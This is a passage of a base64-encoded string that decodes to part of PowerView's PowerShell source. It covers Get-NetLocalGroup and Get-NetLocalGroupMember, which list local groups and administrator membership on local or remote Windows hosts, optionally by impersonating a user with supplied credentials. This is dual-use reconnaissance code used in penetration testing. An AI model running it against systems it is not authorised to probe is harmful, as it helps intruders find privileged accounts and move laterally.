G9jYWwgdXNlciBpbmZvcm1hdGlvbgogICAgICAgICAgICAgICAgJFJlc3VsdCA9ICROZXRhcGkzMjo6TmV0TG9jYWxHcm91cEVudW0oJENvbXB1dGVyLCAkUXVlcnlMZXZlbCwgW3JlZl0kUHRySW5mbywgLTEsIFtyZWZdJEVudHJpZXNSZWFkLCBbcmVmXSRUb3RhbFJlYWQsIFtyZWZdJFJlc3VtZUhhbmRsZSkKCiAgICAgICAgICAgICAgICAjIGxvY2F0ZSB0aGUgb2Zmc2V0IG9mIHRoZSBpbml0aWFsIGludFB0cgogICAgICAgICAgICAgICAgJE9mZnNldCA9ICRQdHJJbmZvLlRvSW50NjQoKQoKICAgICAgICAgICAgICAgICMgMCA9IHN1Y2Nlc3MKICAgICAgICAgICAgICAgIGlmICgoJFJlc3VsdCAtZXEgMCkgLWFuZCAoJE9mZnNldCAtZ3QgMCkpIHsKCiAgICAgICAgICAgICAgICAgICAgIyBXb3JrIG91dCBob3cgbXVjaCB0byBpbmNyZW1lbnQgdGhlIHBvaW50ZXIgYnkgZmluZGluZyBvdXQgdGhlIHNpemUgb2YgdGhlIHN0cnVjdHVyZQogICAgICAgICAgICAgICAgICAgICRJbmNyZW1lbnQgPSAkTE9DQUxHUk9VUF9JTkZPXzE6OkdldFNpemUoKQoKICAgICAgICAgICAgICAgICAgICAjIHBhcnNlIGFsbCB0aGUgcmVzdWx0IHN0cnVjdHVyZXMKICAgICAgICAgICAgICAgICAgICBmb3IgKCRpID0gMDsgKCRpIC1sdCAkRW50cmllc1JlYWQpOyAkaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgY3JlYXRlIGEgbmV3IGludCBwdHIgYXQgdGhlIGdpdmVuIG9mZnNldCBhbmQgY2FzdCB0aGUgcG9pbnRlciBhcyBvdXIgcmVzdWx0IHN0cnVjdHVyZQogICAgICAgICAgICAgICAgICAgICAgICAkTmV3SW50UHRyID0gTmV3LU9iamVjdCBTeXN0ZW0uSW50cHRyIC1Bcmd1bWVudExpc3QgJE9mZnNldAogICAgICAgICAgICAgICAgICAgICAgICAkSW5mbyA9ICROZXdJbnRQdHIgLWFzICRMT0NBTEdST1VQX0lORk9fMQoKICAgICAgICAgICAgICAgICAgICAgICAgJE9mZnNldCA9ICROZXdJbnRQdHIuVG9JbnQ2NCgpCiAgICAgICAgICAgICAgICAgICAgICAgICRPZmZzZXQgKz0gJEluY3JlbWVudAoKICAgICAgICAgICAgICAgICAgICAgICAgJExvY2FsR3JvdXAgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICRMb2NhbEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgICAgICRMb2NhbEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwTmFtZScgJEluZm8ubGdycGkxX25hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJExvY2FsR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tbWVudCcgJEluZm8ubGdycGkxX2NvbW1lbnQKICAgICAgICAgICAgICAgICAgICAgICAgJExvY2FsR3JvdXAuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkxvY2FsR3JvdXAuQVBJJykKICAgICAgICAgICAgICAgICAgICAgICAgJExvY2FsR3JvdXAKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgIyBmcmVlIHVwIHRoZSByZXN1bHQgYnVmZmVyCiAgICAgICAgICAgICAgICAgICAgJE51bGwgPSAkTmV0YXBpMzI6Ok5ldEFwaUJ1ZmZlckZyZWUoJFB0ckluZm8pCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LU5ldExvY2FsR3JvdXBdIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRSZXN1bHQpLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgIyBvdGhlcndpc2Ugd2UncmUgdXNpbmcgdGhlIFdpbk5UIHNlcnZpY2UgcHJvdmlkZXIKICAgICAgICAgICAgICAgICRDb21wdXRlclByb3ZpZGVyID0gW0FEU0ldIldpbk5UOi8vJENvbXB1dGVyLGNvbXB1dGVyIgoKICAgICAgICAgICAgICAgICRDb21wdXRlclByb3ZpZGVyLnBzYmFzZS5jaGlsZHJlbiB8IFdoZXJlLU9iamVjdCB7ICRfLnBzYmFzZS5zY2hlbWFDbGFzc05hbWUgLWVxICdncm91cCcgfSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkTG9jYWxHcm91cCA9IChbQURTSV0kXykKICAgICAgICAgICAgICAgICAgICAkR3JvdXAgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgJEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwTmFtZScgKCRMb2NhbEdyb3VwLkludm9rZUdldCgnTmFtZScpKQogICAgICAgICAgICAgICAgICAgICRHcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTSUQnICgoTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcigkTG9jYWxHcm91cC5JbnZva2VHZXQoJ29iamVjdHNpZCcpLDApKS5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICAkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tbWVudCcgKCRMb2NhbEdyb3VwLkludm9rZUdldCgnRGVzY3JpcHRpb24nKSkKICAgICAgICAgICAgICAgICAgICAkR3JvdXAuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkxvY2FsR3JvdXAuV2luTlQnKQogICAgICAgICAgICAgICAgICAgICRHcm91cAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgCiAgICBFTkQgewogICAgICAgIGlmICgkTG9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1OZXRMb2NhbEdyb3VwTWVtYmVyIHsKPCMKLlNZTk9QU0lTCgpFbnVtZXJhdGVzIG1lbWJlcnMgb2YgYSBzcGVjaWZpYyBsb2NhbCBncm91cCBvbiB0aGUgbG9jYWwgKG9yIHJlbW90ZSkgbWFjaGluZS4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogUFNSZWZsZWN0LCBDb252ZXJ0LUFETmFtZSAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gd2lsbCBlbnVtZXJhdGUgdGhlIG1lbWJlcnMgb2YgYSBzcGVjaWZpZWQgbG9jYWwgZ3JvdXAgIG9uIHRoZQpjdXJyZW50LCBvciByZW1vdGUsIG1hY2hpbmUuIEJ5IGRlZmF1bHQsIHRoZSBXaW4zMiBBUEkgY2FsbCBOZXRMb2NhbEdyb3VwR2V0TWVtYmVycwp3aWxsIGJlIHVzZWQgKGZvciBzcGVlZCkuIFNwZWNpZnlpbmcgIi1NZXRob2QgV2luTlQiIGNhdXNlcyB0aGUgV2luTlQgc2VydmljZSBwcm92aWRlcgp0byBiZSB1c2VkIGluc3RlYWQsIHdoaWNoIHJldHVybnMgYSBsYXJnZXIgYW1vdW50IG9mIGluZm9ybWF0aW9uLgoKLlBBUkFNRVRFUiBDb21wdXRlck5hbWUKClNwZWNpZmllcyB0aGUgaG9zdG5hbWUgdG8gcXVlcnkgZm9yIHNlc3Npb25zIChhbHNvIGFjY2VwdHMgSVAgYWRkcmVzc2VzKS4KRGVmYXVsdHMgdG8gdGhlIGxvY2FsaG9zdC4KCi5QQVJBTUVURVIgR3JvdXBOYW1lCgpUaGUgbG9jYWwgZ3JvdXAgbmFtZSB0byBxdWVyeSBmb3IgdXNlcnMuIElmIG5vdCBnaXZlbiwgaXQgZGVmYXVsdHMgdG8gIkFkbWluaXN0cmF0b3JzIi4KCi5QQVJBTUVURVIgTWV0aG9kCgpUaGUgY29sbGVjdGlvbiBtZXRob2QgdG8gdXNlLCBkZWZhdWx0cyB0byAnQVBJJywgYWxzbyBhY2NlcHRzICdXaW5OVCcuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gYSByZW1vdGUgbWFjaGluZS4gT25seSBhcHBsaWNhYmxlIHdpdGggIi1NZXRob2QgV2luTlQiLgoKLkVYQU1QTEUKCkdldC1OZXRMb2NhbEdyb3VwTWVtYmVyIHwgZnQKCkNvbXB1dGVyTmFtZSAgIEdyb3VwTmFtZSAgICAgIE1lbWJlck5hbWUgICAgIFNJRCAgICAgICAgICAgICAgICAgICBJc0dyb3VwICAgICAgIElzRG9tYWluCi0tLS0tLS0tLS0tLSAgIC0tLS0tLS0tLSAgICAgIC0tLS0tLS0tLS0gICAgIC0tLSAgICAgICAgICAgICAgICAgICAtLS0tLS0tICAgICAgIC0tLS0tLS0tCldJTkRPV1MxICAgICAgIEFkbWluaXN0cmF0b3JzIFdJTkRPV1MxXEFkLi4uIFMtMS01LTIxLTI1Li4uICAgICAgICAgIEZhbHNlICAgICAgICAgIEZhbHNlCldJTkRPV1MxICAgICAgIEFkbWluaXN0cmF0b3JzIFdJTkRPV1MxXGxvLi4uIFMtMS01LTIxLTI1Li4uICAgICAgICAgIEZhbHNlICAgICAgICAgIEZhbHNlCldJTkRPV1MxICAgICAgIEFkbWluaXN0cmF0b3JzIFRFU1RMQUJcRG9tLi4uIFMtMS01LTIxLTg5Li4uICAgICAgICAgICBUcnVlICAgICAgICAgICBUcnVlCldJTkRPV1MxICAgICAgIEFkbWluaXN0cmF0b3JzIFRFU1RMQUJcaGFyLi4uIFMtMS01LTIxLTg5Li4uICAgICAgICAgIEZhbHNlICAgICAgICAgICBUcnVlCgouRVhBTVBMRQoKR2V0LU5ldExvY2FsR3JvdXBNZW1iZXIgLU1ldGhvZCB3aW5udCB8IGZ0CgpDb21wdXRlck5hbWUgICBHcm91cE5hbWUgICAgICBNZW1iZXJOYW1lICAgICBTSUQgICAgICAgICAgICAgICAgICAgSXNHcm91cCAgICAgICBJc0RvbWFpbgotLS0tLS0tLS0tLS0gICAtLS0tLS0tLS0gICAgICAtLS0tLS0tLS0tICAgICAtLS0gICAgICAgICAgICAgICAgICAgLS0tLS0tLSAgICAgICAtLS0tLS0tLQpXSU5ET1dTMSAgICAgICBBZG1pbmlzdHJhdG9ycyBXSU5ET1dTMVxBZC4uLiBTLTEtNS0yMS0yNS4uLiAgICAgICAgICBGYWxzZSAgICAgICAgICBGYWxzZQpXSU5ET1dTMSAgICAgICBBZG1pbmlzdHJhdG9ycyBXSU5ET1dTMVxsby4uLiBTLTEtNS0yMS0yNS4uLiAgICAgICAgICBGYWxzZSAgICAgICAgICBGYWxzZQpXSU5ET1dTMSAgICAgICBBZG1pbmlzdHJhdG9ycyBURVNUTEFCXERvbS4uLiBTLTEtNS0yMS04OS4uLiAgICAgICAgICAgVHJ1ZSAgICAgICAgICAgVHJ1ZQpXSU5ET1dTMSAgICAgICBBZG1pbmlzdHJhdG9ycyBURVNUTEFCXGhhci4uLiBTLTEtNS0yMS04OS4uLiAgICAgICAgICBGYWxzZSAgICAgICAgICAgVHJ1ZQoKLkVYQU1QTEUKCkdldC1OZXRMb2NhbEdyb3VwIHwgR2V0LU5ldExvY2FsR3JvdXBNZW1iZXIgfCBmdAoKQ29tcHV0ZXJOYW1lICAgR3JvdXBOYW1lICAgICAgTWVtYmVyTmFtZSAgICAgU0lEICAgICAgICAgICAgICAgICAgIElzR3JvdXAgICAgICAgSXNEb21haW4KLS0tLS0tLS0tLS0tICAgLS0tLS0tLS0tICAgICAgLS0tLS0tLS0tLSAgICAgLS0tICAgICAgICAgICAgICAgICAgIC0tLS0tLS0gICAgICAgLS0tLS0tLS0KV0lORE9XUzEgICAgICAgQWRtaW5pc3RyYXRvcnMgV0lORE9XUzFcQWQuLi4gUy0xLTUtMjEtMjUuLi4gICAgICAgICAgRmFsc2UgICAgICAgICAgRmFsc2UKV0lORE9XUzEgICAgICAgQWRtaW5pc3RyYXRvcnMgV0lORE9XUzFcbG8uLi4gUy0xLTUtMjEtMjUuLi4gICAgICAgICAgRmFsc2UgICAgICAgICAgRmFsc2UKV0lORE9XUzEgICAgICAgQWRtaW5pc3RyYXRvcnMgVEVTVExBQlxEb20uLi4gUy0xLTUtMjEtODkuLi4gICAgICAgICAgIFRydWUgICAgICAgICAgIFRydWUKV0lORE9XUzEgICAgICAgQWRtaW5pc3RyYXRvcnMgVEVTVExBQlxoYXIuLi4gUy0xLTUtMjEtODkuLi4gICAgICAgICAgRmFsc2UgICAgICAgICAgIFRydWUKV0lORE9XUzEgICAgICAgR3Vlc3RzICAgICAgICAgV0lORE9XUzFcR3Vlc3QgUy0xLTUtMjEtMjUuLi4gICAgICAgICAgRmFsc2UgICAgICAgICAgRmFsc2UKV0lORE9XUzEgICAgICAgSUlTX0lVU1JTICAgICAgTlQgQVVUSE9SSVQuLi4gUy0xLTUtMTcgICAgICAgICAgICAgICAgRmFsc2UgICAgICAgICAgRmFsc2UKV0lORE9XUzEgICAgICAgVXNlcnMgICAgICAgICAgTlQgQVVUSE9SSVQuLi4gUy0xLTUtNCAgICAgICAgICAgICAgICAgRmFsc2UgICAgICAgICAgRmFsc2UKV0lORE9XUzEgICAgICAgVXNlcnMgICAgICAgICAgTlQgQVVUSE9SSVQuLi4gUy0xLTUtMTEgICAgICAgICAgICAgICAgRmFsc2UgICAgICAgICAgRmFsc2UKV0lORE9XUzEgICAgICAgVXNlcnMgICAgICAgICAgV0lORE9XUzFcbG8uLi4gUy0xLTUtMjEtMjUuLi4gICAgICAgICAgRmFsc2UgICAgICAgIFVOS05PV04KV0lORE9XUzEgICAgICAgVXNlcnMgICAgICAgICAgVEVTVExBQlxEb20uLi4gUy0xLTUtMjEtODkuLi4gICAgICAgICAgIFRydWUgICAgICAgIFVOS05PV04KCi5FWEFNUExFCgpHZXQtTmV0TG9jYWxHcm91cE1lbWJlciAtQ29tcHV0ZXJOYW1lIHByaW1hcnkudGVzdGxhYi5sb2NhbCB8IGZ0CgpDb21wdXRlck5hbWUgICBHcm91cE5hbWUgICAgICBNZW1iZXJOYW1lICAgICBTSUQgICAgICAgICAgICAgICAgICAgSXNHcm91cCAgICAgICBJc0RvbWFpbgotLS0tLS0tLS0tLS0gICAtLS0tLS0tLS0gICAgICAtLS0tLS0tLS0tICAgICAtLS0gICAgICAgICAgICAgICAgICAgLS0tLS0tLSAgICAgICAtLS0tLS0tLQpwcmltYXJ5LnRlcy4uLiBBZG1pbmlzdHJhdG9ycyBURVNUTEFCXEFkbS4uLiBTLTEtNS0yMS04OS4uLiAgICAgICAgICBGYWxzZSAgICAgICAgICBGYWxzZQpwcmltYXJ5LnRlcy4uLiBBZG1pbmlzdHJhdG9ycyBURVNUTEFCXGxvYy4uLiBTLTEtNS0yMS04OS4uLiAgICAgICAgICBGYWxzZSAgICAgICAgICBGYWxzZQpwcmltYXJ5LnRlcy4uLiBBZG1pbmlzdHJhdG9ycyBURVNUTEFCXEVudC4uLiBTLTEtNS0yMS04OS4uLiAgICAgICAgICAgVHJ1ZSAgICAgICAgICBGYWxzZQpwcmltYXJ5LnRlcy4uLiBBZG1pbmlzdHJhdG9ycyBURVNUTEFCXERvbS4uLiBTLTEtNS0yMS04OS4uLiAgICAgICAgICAgVHJ1ZSAgICAgICAgICBGYWxzZQoKLk9VVFBVVFMKClBvd2VyVmlldy5Mb2NhbEdyb3VwTWVtYmVyLkFQSQoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCBncm91cCBwcm9wZXJ0eSBmaWVsZHMgZnJvbSBBUEkgcmVzdWx0cy4KClBvd2VyVmlldy5Mb2NhbEdyb3VwTWVtYmVyLldpbk5UCgpDdXN0b20gUFNPYmplY3Qgd2l0aCB0cmFuc2xhdGVkIGdyb3VwIHByb3BlcnR5IGZpZWxkcyBmcm9tIFdpbk5UIHJlc3VsdHMuCgouTElOSwoKaHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy8yMTI4ODIyMC9nZXQtYWxsLWxvY2FsLW1lbWJlcnMtYW5kLWdyb3Vwcy1kaXNwbGF5ZWQtdG9nZXRoZXIKaHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2FhNzcyMjExKFZTLjg1KS5hc3B4Cmh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvd2luZG93cy9kZXNrdG9wL2FhMzcwNjAxKHY9dnMuODUpLmFzcHgKIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Mb2NhbEdyb3VwTWVtYmVyLkFQSScpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Mb2NhbEdyb3VwTWVtYmVyLldpbk5UJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJywgJ2Ruc2hvc3RuYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJEVudjpDT01QVVRFUk5BTUUsCgogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEdyb3VwTmFtZSA9ICdBZG1pbmlzdHJhdG9ycycsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQVBJJywgJ1dpbk5UJyldCiAgICAgICAgW0FsaWFzKCdDb2xsZWN0aW9uTWV0aG9kJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTWV0aG9kID0gJ0FQSScsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgaWYgKCRNZXRob2QgLWVxICdBUEknKSB7CiAgICAgICAgICAgICAgICAjIGlmIHdlJ3JlIHVzaW5nIHRoZSBOZXRhcGkzMiBOZXRMb2NhbEdyb3VwR2V0TWVtYmVycyBBUEkgY2FsbCB0byBnZXQgdGhlIGxvY2FsIGdyb3VwIGluZm9ybWF0aW9uCgogICAgICAgICAgICAgICAgIyBhcmd1bWVudHMgZm9yIE5ldExvY2FsR3JvdXBHZXRNZW1iZXJzCiAgICAgICAgICAgICAgICAkUXVlcnlMZXZlbCA9IDIKICAgICAgICAgICAgICAgICRQdHJJbmZvID0gW0ludFB0cl06Olplcm8KICAgICAgICAgICAgICAgICRFbnRyaWVzUmVhZCA9IDAKICAgICAgICAgICAgICAgICRUb3RhbFJlYWQgPSAwCiAgICAgICAgICAgICAgICAkUmVzdW1lSGFuZGxlID0gMAoKICAgICAgICAgICAgICAgICMgZ2V0IHRoZSBsb2NhbCB1c2VyIGluZm9ybWF0aW9uCiAgICAgICAgICAgICAgICAkUmVzdWx0ID0gJE5ldGFwaTMyOjpOZXRMb2NhbEdyb3VwR2V0TWVtYmVycygkQ29tcHV0ZXIsICRHcm91cE5hbWUsICRRdWVyeUxldmVsLCBbcmVmXSRQdHJJbmZvLCAtMSwgW3JlZl0kRW50cmllc1JlYWQsIFtyZWZdJFRvdGFsUmVhZCwgW3JlZl0kUmVzdW1lSGFuZGxlKQoKICAgICAgICAgICAgICAgICMgbG9jYXRlIHRoZSBvZmZzZXQgb2YgdGhlIGluaXRpYWwgaW50UHRyCiAgICAgICAgICAgICAgICAkT2Zmc2V0ID0gJFB0ckluZm8uVG9JbnQ2NCgpCgogICAgICAgICAgICAgICAgJE1lbWJlcnMgPSBAKCkKCiAgICAgICAgICAgICAgICAjIDAgPSBzdWNjZXNzCiAgICAgICAgICAgICAgICBpZiAoKCRSZXN1bHQgLWVxIDApIC1hbmQgKCRPZmZzZXQgLWd0IDApKSB7CgogICAgICAgICAgICAgICAgICAgICMgV29yayBvdXQgaG93IG11Y2ggdG8gaW5jcmVtZW50IHRoZSBwb2ludGVyIGJ5IGZpbmRpbmcgb3V0IHRoZSBzaXplIG9mIHRoZSBzdHJ1Y3R1cmUKICAgICAgICAgICAgICAgICAgICAkSW5jcmVtZW50ID0gJExPQ0FMR1JPVVBfTUVNQkVSU19JTkZPXzI6OkdldFNpemUoKQoKICAgICAgICAgICAgICAgICAgICAjIHBhcnNlIGFsbCB0aGUgcmVzdWx0IHN0cnVjdHVyZXMKICAgICAgICAgICAgICAgICAgICBmb3IgKCRpID0gMDsgKCRpIC1sdCAkRW50cmllc1JlYWQpOyAkaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgY3JlYXRlIGEgbmV3IGludCBwdHIgYXQgdGhlIGdpdmVuIG9mZnNldCBhbmQgY2FzdCB0aGUgcG9pbnRlciBhcyBvdXIgcmVzdWx0IHN0cnVjdHVyZQogICAgICAgICAgICAgICAgICAgICAgICAkTmV3SW50UHRyID0gTmV3LU9iamVjdCBTeXN0ZW0uSW50cHRyIC1Bcmd1bWVudExpc3QgJE9mZnNldAogICAgICAgICAgICAgICAgICAgICAgICAkSW5mbyA9ICROZXdJbnRQdHIgLWFzICRMT0NBTEdST1VQX01FTUJFUlNfSU5GT18yCgogICAgICAgICAgICAgICAgICAgICAgICAkT2Zmc2V0ID0gJE5ld0ludFB0ci5Ub0ludDY0KCkKICAgICAgICAgICAgICAgICAgICAgICAgJE9mZnNldCArPSAkSW5jcmVtZW50CgogICAgICAgICAgICAgICAgICAgICAgICAkU2lkU3RyaW5nID0gJycKICAgICAgICAgICAgICAgICAgICAgICAgJFJlc3VsdDIgPSAkQWR2YXBpMzI6OkNvbnZlcnRTaWRUb1N0cmluZ1NpZCgkSW5mby5sZ3JtaTJfc2lkLCBbcmVmXSRTaWRTdHJpbmcpOyRMYXN0RXJyb3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0MiAtZXEgMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1OZXRMb2NhbEdyb3VwTWVtYmVyXSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkTGFzdEVycm9yKS5NZXNzYWdlKSIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwTmFtZScgJEdyb3VwTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNZW1iZXJOYW1lJyAkSW5mby5sZ3JtaTJfZG9tYWluYW5kbmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTSUQnICRTaWRTdHJpbmcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJc0dyb3VwID0gJCgkSW5mby5sZ3JtaTJfc2lkdXNhZ2UgLWVxICdTaWRUeXBlR3JvdXAnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJc0dyb3VwJyAkSXNHcm91cAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlci5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuTG9jYWxHcm91cE1lbWJlci5BUEknKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcnMgKz0gJE1lbWJlcgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAjIGZyZWUgdXAgdGhlIHJlc3VsdCBidWZmZXIKICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICROZXRhcGkzMjo6TmV0QXBpQnVmZmVyRnJlZSgkUHRySW5mbykKCiAgICAgICAgICAgICAgICAgICAgIyB0cnkgdG8gZXh0cmFjdCBvdXQgdGhlIG1hY2hpbmUgU0lEIGJ5IHVzaW5nIHRoZSAtNTAwIGFjY291bnQgYXMgYSByZWZlcmVuY2UKICAgICAgICAgICAgICAgICAgICAkTWFjaGluZVNpZCA9ICRNZW1iZXJzIHwgV2hlcmUtT2JqZWN0IHskXy5TSUQgLW1hdGNoICcuKi01MDAnIC1vciAoJF8uU0lEIC1tYXRjaCAnLiotNTAxJyl9IHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kIFNJRAogICAgICAgICAgICAgICAgICAgIGlmICgkTWFjaGluZVNpZCkgewogICAgICAgICAgICAgICAgICAgICAgICAkTWFjaGluZVNpZCA9ICRNYWNoaW5lU2lkLlN1YnN0cmluZygwLCAkTWFjaGluZVNpZC5MYXN0SW5kZXhPZignLScpKQoKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcnMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJF8uU0lEIC1tYXRjaCAkTWFjaGluZVNpZCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lzRG9tYWluJyAkRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lzRG9tYWluJyAkVHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVycyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy5TSUQgLW5vdG1hdGNoICdTLTEtNS0yMScpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJc0RvbWFpbicgJEZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXyB8IEFkZC1N